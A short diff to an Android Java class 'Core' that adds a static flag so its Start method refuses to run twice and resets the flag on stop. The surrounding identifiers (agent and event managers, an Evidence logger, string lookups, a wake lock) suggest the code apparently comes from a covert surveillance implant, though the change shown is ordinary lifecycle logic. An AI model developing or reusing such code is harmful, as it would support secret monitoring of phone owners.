@@ -39,6 +39,7 @@ public class Core extends Activity implements Runnable {
 	/** The Constant SLEEPING_TIME. */
 	private static final int SLEEPING_TIME = 1000;
 	private static final String TAG = "Core"; //$NON-NLS-1$
+	private static boolean serviceRunning = false;
 
 	/** The b stop core. */
 	private boolean bStopCore = false;
@@ -72,6 +73,14 @@ public class Core extends Activity implements Runnable {
 	 * @return true, if successful
 	 */
 	public boolean Start(final Resources r, final ContentResolver cr) {
+		if (serviceRunning == true) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (Start): service already running"); //$NON-NLS-1$
+			}
+			
+			return false;
+		}
+		
 		coreThread = new Thread(this);
 		agentManager = ManagerAgent.self();
 		eventManager = ManagerEvent.self();
@@ -98,6 +107,8 @@ public class Core extends Activity implements Runnable {
 		wl.acquire();
 
 		Evidence.info(Messages.getString("30.1")); //$NON-NLS-1$
+		
+		serviceRunning = true;
 		return true;
 	}
 
@@ -114,6 +125,9 @@ public class Core extends Activity implements Runnable {
 		}
 		
 		wl.release();
+		
+		serviceRunning = false;
+		
 		return true;
 	}
 
